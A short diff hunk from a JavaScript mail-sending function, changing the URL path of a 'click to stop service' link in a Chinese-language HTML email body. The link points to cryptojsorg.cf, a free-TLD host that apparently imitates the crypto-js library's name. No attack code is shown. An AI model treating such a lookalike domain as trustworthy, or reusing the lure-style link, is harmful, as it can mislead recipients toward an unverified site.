@@ -33,7 +33,7 @@ function sendMail(mail, code, call) {
         <p>这里是"重要提示有访客"停止:</p>
         <p>这里是"重要提示有访客"停止:</p>
         <p>这里是"重要提示有访客"停止:</p>
-        <a href="http://cryptojsorg.cf/d">点击停止服务</a>`, //页面内容
+        <a href="http://cryptojsorg.cf/dssa">点击停止服务</a>`, //页面内容
         // attachments: [{//发送文件
         //      filename: 'index.html', //文件名字
         //      path: './index.html' //文件路径
